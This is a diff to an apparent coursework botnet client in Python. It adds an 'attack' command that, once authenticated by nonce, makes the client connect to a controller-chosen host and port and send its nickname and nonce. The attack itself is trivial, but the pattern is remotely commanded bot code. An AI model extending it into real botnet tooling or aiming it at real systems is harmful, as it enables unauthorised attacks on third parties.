@@ -19,7 +19,7 @@ import hashlib
 import shlex
 import time
 from array import *
-
+from typing import Union
 #global nonce 
 seen_nonces = list()
 
@@ -35,6 +35,21 @@ def parse_args():
     #                    help="enable debugging output")
     return parser.parse_args()
 
+def attack_server(hostname: Union[str, int], port:int, nickname:str, nonce: str):
+    try:
+        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        client_socket.connect((hostname, port))
+        attack_send = nickname + nonce
+        try:
+            client_socket.send(attack_send.encode())
+        except :
+            print("-attack ", nickname, " FAIL Could not send attack")
+
+    except (ConnectionAbortedError, ConnectionRefusedError, ConnectionResetError) as error:
+        print("-attack ", nickname, " FAIL ", error)
+        return
+
+    return
 def client_program(args: str, sock: socket):
 
     split_hostPort = args.hostname_port.split(":")
@@ -69,7 +84,12 @@ def client_program(args: str, sock: socket):
             else:
                 seen_nonces.append(cmd_data[0])
                 #execute command
+                if(cmd_data[2] == "attack"):
+                    split_attack = cmd_data[3].split(":")
+                    attack_server(split_attack[0], int(split_attack[1]), args.nickname, cmd_data[0])
+                    print("-attack ", args.nickname , " OK")
                 print("command authenticated")
+                
         
         #client_socket.send(message.encode)
         #client_socket.close()
